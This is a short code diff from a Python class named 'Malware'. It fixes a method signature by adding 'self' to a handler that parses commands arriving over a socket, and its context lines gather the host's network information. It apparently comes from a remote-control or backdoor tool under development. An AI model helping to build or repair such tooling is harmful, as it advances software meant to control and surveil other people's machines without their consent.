@@ -86,7 +86,7 @@ class Malware:
             self.get_network_infos()
         ).encode()
 
-    def create_thing(get_cmd,sock):
+    def create_thing(self,get_cmd,sock):
         cmd = get_cmd.split()
         file_type = cmd[1]
         if file_type == 'file':
